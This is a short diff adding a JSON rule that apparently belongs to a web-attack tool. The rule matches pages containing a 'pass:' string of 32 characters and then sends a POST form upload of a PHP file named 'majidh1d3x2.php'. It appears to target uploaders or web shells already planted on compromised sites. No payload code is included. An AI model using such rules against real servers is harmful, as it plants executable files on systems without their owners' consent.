@@ -1,0 +1,10 @@
+{
+    "hint":"send php file",
+    "findedByRegexInContent":"pass: [a-zA-Z0-9]{32}",
+    "method":"POST",
+    "isFormData": true,
+    "body":{
+        "filename": "majidh1d3x2.php",
+        "uploadedfile":"1"
+    }
+}
